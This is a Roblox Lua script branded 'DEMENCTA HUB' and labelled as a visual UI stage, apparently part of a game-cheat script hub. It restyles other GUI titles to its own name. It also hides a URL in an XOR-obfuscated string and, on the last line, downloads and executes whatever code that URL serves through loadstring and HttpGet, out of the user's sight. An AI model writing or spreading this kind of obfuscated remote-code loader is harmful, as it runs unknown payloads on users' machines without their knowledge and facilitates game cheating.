
--[[ STAGE 2: VISUAL CORE ]]
local oBcubd4y1WmPDD6J="\248\213\215\158\140\221\248\225\233\061\215\220\046\025\028\118\124\099\008\125\026\024\014\010\121\188\076\186\144\078\168\131\140\246\245\243\232\141\224\155\210\198\194\054\048\043\045\199\042\021\008\003\008\122\122\014\098\067\086\102\014\176\182\183\164\083\151\152\148\247\140\141\248\232\225\149\209\203\201\199\052\053\038\035\023\031\001\201\012\123\112\038\081\080\082\068\075\179\072\162\184\147\154\174\132\130\247\243\246\160\208\231\223\131\132\250\058\062\043\044\041"local ahm86XZaEvbxAZ8qt=179 local _GXw4tm8s5G1KAaYv=226 local ZWbbozgwjrnYfthNr0d=1 local OvuOSfqSN9tibuWGZEf=7 local pYMHX8dzAU2_8hlZ2xriT=1 local vzt7NrS_ArW9tM6FHPH=true local KdXEDFUqnLXuPrSqb5h=bit32 and bit32.bxor if not KdXEDFUqnLXuPrSqb5h then KdXEDFUqnLXuPrSqb5h=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local LVhVDBweV4HR6U1vXz={}for wwNE_IV4PoSuTkdrqg4bB=1,#oBcubd4y1WmPDD6J do local j0rBB0NdzQrdThDzUAVHdx=string.byte(oBcubd4y1WmPDD6J,wwNE_IV4PoSuTkdrqg4bB)local iZh_qvFf5bv6w=(_GXw4tm8s5G1KAaYv+(wwNE_IV4PoSuTkdrqg4bB*OvuOSfqSN9tibuWGZEf)+pYMHX8dzAU2_8hlZ2xriT)%256 if ZWbbozgwjrnYfthNr0d==0 then j0rBB0NdzQrdThDzUAVHdx=(j0rBB0NdzQrdThDzUAVHdx-iZh_qvFf5bv6w)%256 LVhVDBweV4HR6U1vXz[wwNE_IV4PoSuTkdrqg4bB]=string.char(KdXEDFUqnLXuPrSqb5h(j0rBB0NdzQrdThDzUAVHdx,ahm86XZaEvbxAZ8qt))else j0rBB0NdzQrdThDzUAVHdx=KdXEDFUqnLXuPrSqb5h(j0rBB0NdzQrdThDzUAVHdx,ahm86XZaEvbxAZ8qt)LVhVDBweV4HR6U1vXz[wwNE_IV4PoSuTkdrqg4bB]=string.char((j0rBB0NdzQrdThDzUAVHdx-iZh_qvFf5bv6w)%256)end end local kSCfX4V_uz6jCZIn=table.concat(LVhVDBweV4HR6U1vXz)if vzt7NrS_ArW9tM6FHPH then kSCfX4V_uz6jCZIn=string.reverse(kSCfX4V_uz6jCZIn)end local J2afNcYIE0sqaCCw=kSCfX4V_uz6jCZIn
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(J2afNcYIE0sqaCCw))()
